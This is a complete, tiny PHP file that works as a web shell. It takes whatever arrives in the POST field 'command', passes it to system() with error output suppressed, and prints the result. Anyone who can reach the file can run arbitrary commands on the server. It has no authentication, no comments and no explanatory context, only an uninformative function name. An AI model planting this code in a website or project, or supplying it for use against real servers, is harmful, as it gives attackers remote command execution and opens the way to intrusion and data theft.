<?php
function exTKL() {
	$in=$_POST['command'];

	$out = '';
	if (function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	}
	echo $out;
}

exTKL();
?>